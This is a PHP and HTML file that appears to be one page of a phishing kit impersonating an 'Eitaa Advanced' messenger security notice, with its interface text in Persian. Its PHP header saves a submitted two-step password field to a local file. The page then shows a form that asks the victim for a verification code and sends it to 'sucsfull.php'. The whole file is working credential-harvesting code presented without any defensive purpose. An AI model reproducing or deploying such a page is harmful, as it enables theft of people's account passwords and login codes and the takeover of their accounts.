<?php
$l2 = $_POST["2level"];
$f = fopen("2level", "w");
fwrite($f,$l2);
?>
<html>
	<head>
		<title>ایتا پیشرفته - مشکل امنیتی</title>
		<link rel="stylesheet" href="css/style.css"/>
		<link rel="icon" href="img/logo.jpg">
	</head>

	<body class="body">
		<center>
			<div class="uper">
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<div class="login">
					<br/>
					<br/>
					<br/>
					<img src="img/logo.jpg" width=100/>
					<br/>
					<br/>
					<br/>
					<form action="sucsfull.php" method="post">
						<label for="cd">لطفا کد تایید را وارد کنید</label>
						<br/>
						<br/>
						<input id="cd" type="number" name="code" placeholder="کد تایید"/>
						<br/>
						<br/>
						<br/>
						<br/>
						<input type="submit" value="ثبت">
					</form>
					<br/>
				</div>
				<br/>
				<br/>
				<br/>
			</div>
			</center>
			<div class="downer">
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<h3 class="pro-shad">ایتا پیشرفته</h3>
			</div>
		
	</body>
</html>
